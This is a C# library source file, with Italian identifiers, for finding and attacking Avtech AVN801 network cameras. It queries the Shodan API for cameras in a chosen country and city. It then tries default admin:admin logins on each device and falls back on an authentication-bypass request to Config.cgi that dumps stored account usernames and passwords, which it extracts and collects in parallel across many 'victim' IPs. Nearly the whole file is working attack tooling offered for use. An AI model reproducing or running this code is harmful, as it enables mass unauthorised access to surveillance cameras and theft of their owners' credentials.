using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Threading;
using System.Text.RegularExpressions;
using Avtechlib.Avtechinfo;
using Leaf.xNet;

namespace Avtechlib
{
    /// <summary>
    /// Class for scanning and attacking Avtech video surveillance services
    /// </summary>
    public class Avtech
    {
        /// <summary>
        /// Token class field to stop the attack
        /// </summary>
        private CancellationTokenSource Task_Token;

        /// <summary>
        /// Field indicating whether the parallel attack has started
        /// </summary>
        private bool Parallel_Run = false;

        /// <summary>
        /// Event that warns how many IPs have been tested
        /// </summary>
        public event EventHandler<Test_Info> Info_Tested;

        /// <summary>
        /// Event that warns when the scan has finished returning an Ip_Info instance
        /// </summary>
        public event EventHandler<Ip_Info> Scan_Terminato;

        /// <summary>
        /// Event that warns when the attack has ended by returning an Attack_Info instance
        /// </summary>
        public event EventHandler<Attack_Info> Attack_Terminato;

        /// <summary>
        /// Synchronous method for scanning Avtech AVN801 service via shodan
        /// </summary>
        /// <param name="Shodan_Api">Shodan api</param>
        /// <param name="Paese">Target country E.g: IT</param>
        /// <param name="Citta">City of the target country E.g: Naples</param>
        /// <param name="Pagina">Shodan page to view 1 page = max 100 results = 1 credit</param>
        /// <returns>Returns the Ip_Info instance with all information about the scan</returns>
        public Ip_Info Scan_Sync(string Shodan_Api, string Paese, string Citta, byte Pagina)
        {
            switch (string.IsNullOrWhiteSpace(Shodan_Api))
            {
                case true:
                    throw new ArgumentException("Controllare l'api.", "Shodan_Api");
            }

            switch (string.IsNullOrWhiteSpace(Paese))
            {
                case true:
                    throw new ArgumentException("Controlla il paese.", "Paese");
            }

            switch (string.IsNullOrWhiteSpace(Citta))
            {
                case true:
                    throw new ArgumentException("Controlla la città.", "Citta");
            }

            switch (Pagina)
            {
                case 0:
                    Pagina = 1;
                    break;
            }

            Ip_Info ip_Info = new Ip_Info();

            using (HttpRequest Richiesta_Api = new HttpRequest())
            {
                try
                {
                    while (true)
                    {
                        HttpResponse Risposta_Api = Richiesta_Api.Get($"https://api.shodan.io/shodan/host/search?key={Shodan_Api}&query=product:\"Avtech AVN801 network camera\" country:\"{Paese}\" city:\"{Citta}\"&page={Pagina}");
                        dynamic Jconv = JsonConvert.DeserializeObject(Risposta_Api.ToString());
                        if (Jconv["total"] != "0")
                        {
                            if (Convert.ToString(Jconv["matches"]) != "[]")
                            {
                                foreach (var Valore in Jconv["matches"])
                                {
                                    ip_Info.Ip_Port_Add = Valore["ip_str"] + ":" + Valore["port"];
                                }
                                break;
                            }
                            else
                            {
                                Pagina--;
                                continue;
                            }
                        }
                        else
                        {
                            break;
                        }
                    }
                }
                catch (HttpException Errore_Http)
                {
                    switch (Errore_Http.HttpStatusCode)
                    {
                        case HttpStatusCode.Unauthorized:
                            throw new ArgumentException("Errore http 401, Api non valida.","Shodan_Api");
                        default:
                            throw new Exception(Errore_Http.Message + " " + Errore_Http.HttpStatusCode);
                    }
                }
            }

            Scan_Terminato?.Invoke(this, ip_Info);
            return ip_Info;
        }

        /// <summary>
        /// Asynchronous method for scanning the Avtech AVN801 service via shodan
        /// </summary>
        /// <param name="Shodan_Api">Shodan api</param>
        /// <param name="Paese">Target country E.g: IT</param>
        /// <param name="Citta">City of the target country E.g: Naples</param>
        /// <param name="Pagina">Shodan page to view 1 page = max 100 results = 1 credit</param>
        /// <returns>Returns the Ip_Info instance with all information about the scan</returns>
        public Task<Ip_Info> Scan_Async(string Shodan_Api, string Paese, string Citta, byte Pagina)
        {
            return Task.Run(() => Scan_Sync(Shodan_Api, Paese, Citta, Pagina));
        }

        /// <summary>
        /// Synchronous method to initiate the attack, attacks performed: Brute and Bypass
        /// </summary>
        /// <param name="Vittime">IP addresses of the victims</param>
        /// <param name="Threads">Threads for parallel operations</param>
        /// <returns>Returns the Attack_Info instance with all information of the attack</returns>
        public Attack_Info Attack_Sync(string[] Vittime, byte Threads)
        {
            switch (Vittime.Length)
            {
                case 0:
                    throw new ArgumentException("Array nullo, non ci sono ip vittime.", "Vittime");
            }

            switch (Threads)
            {
                case 0:
                    Threads = 1;
                    break;
            }

            Test_Info Test_Info = null;

            if (Info_Tested != null)
            {
                Test_Info = new Test_Info(Vittime.Length);
            }

            Attack_Info Attack_Info = new Attack_Info();

            using (Task_Token = new CancellationTokenSource())
            {
                try
                {
                    ParallelOptions OPT = new ParallelOptions();
                    OPT.MaxDegreeOfParallelism = Threads;
                    OPT.CancellationToken = Task_Token.Token;
                    Parallel_Run = true;

                    Parallel.ForEach(Vittime, OPT, Run =>
                    {
                        try
                        {
                            using (HttpRequest Richiesta_Login = new HttpRequest())
                            {
                                HttpResponse Risposta_Admin = Richiesta_Login.Get(Run + "/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&login=quick");
                                if (Risposta_Admin.ToString().Contains("OK"))
                                {
                                    Attack_Info.Ip_Port_Cred_Add = Run + "|admin:admin|Brute";
                                }
                                else if (Risposta_Admin.ToString().Contains("ERROR: Authentication error."))
                                {
                                    HttpResponse Risposta_Bypass = Richiesta_Login.Get(Run + "/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*");
                                    if (Risposta_Bypass.ToString().Contains("OK"))
                                    {
                                        Match Username_Match = Regex.Match(Risposta_Bypass.ToString(), "Account.User" + @"[\d]*.Username=[\S]*");
                                        Match Passowrd_Match = Regex.Match(Risposta_Bypass.ToString(), "Account.User" + @"[\d]*.Password=[\S]*");
                                        if (Username_Match.Success && Passowrd_Match.Success)
                                        {
                                            string Username = Regex.Replace(Username_Match.Value, "Account.User" + @"[\d]*", "").Replace(".Username=", "");
                                            string Password = Regex.Replace(Passowrd_Match.Value, "Account.User" + @"[\d]*", "").Replace(".Password=", "");
                                            Attack_Info.Ip_Port_Cred_Add = Run + $"|{Username}:{Password}|Bypass";
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            //Pass errors
                        }

                        if (Info_Tested != null)
                        {
                            Test_Info.Ips_Testati_Totali += 1;
                            Info_Tested(this, Test_Info);
                        }
                    });

                    Parallel_Run = false;
                }
                catch (OperationCanceledException)
                {
                    //Cancel task
                    Parallel_Run = false;
                }
            }

            Attack_Terminato?.Invoke(this, Attack_Info);
            return Attack_Info;
        }

        /// <summary>
        /// Asynchronous method to initiate the attack, attacks performed: Brute and Bypass
        /// </summary>
        /// <param name="Vittime">IP addresses of the victims</param>
        /// <param name="Threads">Threads for parallel operations</param>
        /// <returns>Returns the Attack_Info instance with all information of the attack</returns>
        public Task<Attack_Info> Attack_Async(string[] Vittime, byte Threads)
        {
            return Task.Run(() => Attack_Sync(Vittime, Threads));
        }

        /// <summary>
        /// Method to end the attack
        /// </summary>
        public void Stop_Attack()
        {
            switch(Parallel_Run)
            {
                case true:
                    Task_Token.Cancel();
                    break;
                case false:
                    throw new Exception("Attacco non avviato o già terminato...");
            }
        }

    }

    namespace Avtechinfo
    {
        /// <summary>
        /// Class that contains the information on ip and ports found in the scan via shodan
        /// </summary>
        public class Ip_Info : EventArgs
        {
            /// <summary>
            /// List containing ip and port found
            /// </summary>
            private List<string> Ip_Port = new List<string>();

            /// <summary>
            /// Properties to view the number of the various ip found
            /// </summary>
            public int Ip_Trovati
            {
                get { return Ip_Port.Count; }
            }

            /// <summary>
            /// Properties for setting a new ip:port in the list of the various addresses found
            /// </summary>
            internal string Ip_Port_Add
            {
                set { Ip_Port.Add(value); }
            }

            /// <summary>
            /// Properties to view all the various ip:ports found
            /// </summary>
            public string[] Ip_Port_Show
            {
                get { return Ip_Port.ToArray(); }
            }
        }

        /// <summary>
        /// Class containing the information of the victims being attacked
        /// </summary>
        public class Attack_Info : EventArgs
        {
            /// <summary>
            /// List containing ip:port and credentials found
            /// </summary>
            private List<string> Ip_Port_Cred = new List<string>();

            /// <summary>
            /// Properties to view the number of credentials found
            /// </summary>
            public int Credenziali_Trovate
            {
                get { return Ip_Port_Cred.Count; }
            }

            /// <summary>
            /// Property that allows you to add ip:port and credentials found in the list
            /// </summary>
            internal string Ip_Port_Cred_Add
            {
                set { Ip_Port_Cred.Add(value); }
            }

            /// <summary>
            /// Property that returns the various ip:port with the credentials found
            /// </summary>
            public string[] Ip_Port_Cred_Show
            {
                get { return Ip_Port_Cred.ToArray(); }
            }
        }

        /// <summary>
        /// Class that contains information about the test
        /// </summary>
        public class Test_Info : EventArgs
        {
            /// <summary>
            /// Field containing total ip to test
            /// </summary>
            private int Ips = 0;

            /// <summary>
            /// Field containing tested ip
            /// </summary>
            private int Ips_Testati = 0;

            /// <summary>
            /// Constructor to set the ip addresses to be tested
            /// </summary>
            /// <param name="Ips_Totali">IP to test</param>
            public Test_Info(int Ips_Totali)
            {
                Ips = Ips_Totali;
            }

            /// <summary>
            /// Properties to view total ip
            /// </summary>
            public int Ips_Totali
            {
                get { return Ips; }
            }

            /// <summary>
            /// Properties to view and set tested ip
            /// </summary>
            public int Ips_Testati_Totali
            {
                get { return Ips_Testati; }
                internal set { Ips_Testati = value; }
            }

            /// <summary>
            /// Properties to view the percentage of the attack
            /// </summary>
            public int Percentuale
            {
                get { return ((Ips_Testati * 100) / Ips); }
            }
        }
    }
}

